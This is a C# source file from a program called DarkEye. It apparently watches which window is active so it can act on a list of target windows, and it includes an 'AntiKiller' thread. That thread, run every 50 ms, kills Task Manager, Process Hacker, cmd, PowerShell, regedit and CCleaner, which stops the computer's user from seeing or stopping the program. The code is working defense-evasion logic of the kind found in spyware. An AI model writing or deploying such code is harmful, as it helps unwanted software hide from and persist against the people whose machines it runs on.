using System;
using System.Diagnostics;
using System.Threading;
using DarkEye.Classes.Objects;

namespace DarkEye.Classes.Utils
{
    /*
    * Created by Gish_Reloaded on 27/03/2020.
    */
    class Streams
    {
        public static void Initialize()
        {
            if(DarkEye.commandManager.IsWritenCommand("-antikill"))
                new Thread(Streams.AntiKiller).Start();
            new Thread(Streams.WindowFinder).Start();
        }

        public static void WindowFinder()
        {
            WriteUtils.write("WindowFinder: Starting...");
            Window currentWindow = null;
            Window tempWindow = null;
            while (true)
            {
                Thread.Sleep(150);
                try
                {
                    foreach (Window window in DarkEye.windowManager.windows)
                    {
                        String activeWindowName = Utils.GetActiveWindowTitle();
                        if (window == null || window.name == null || activeWindowName == null)
                            continue;

                        if (Utils.isWindowEquals(activeWindowName, window.name))
                        {
                            window.target = true;
                            currentWindow = window;
                        }
                        else
                        {
                            window.target = false;
                        }
                    }
                    if (currentWindow != null && currentWindow != tempWindow)
                    {
                        tempWindow = currentWindow;
                        WriteUtils.write("WindowFinder: New target window: " + currentWindow.name);
                    }
                }
                catch (Exception ex)
                {
                    WriteUtils.writeError("WindowFinder: " + ex.ToString());
                }
            }
        }

        public static void AntiKiller()
        {
            String[] targets = new String[] { "Taskmgr", "ProcessHacker", "cmd", "powershell", "regedit", "CCleaner" };
            WriteUtils.writeWarning("AntiKiller: Starting...");
            while (true)
            {
                Thread.Sleep(50);
                try
                {
                    foreach (String target in targets)
                    {
                        foreach (Process process in Process.GetProcessesByName(target))
                        {
                            process.Kill();
                            WriteUtils.write("AntiKiller: Process killed: " + process.Id + ":" + process.ProcessName);
                        }
                    }
                }
                catch (Exception ex)
                {
                    WriteUtils.writeError("AntiKiller: " + ex.ToString());
                }
            }
        }
    }
}
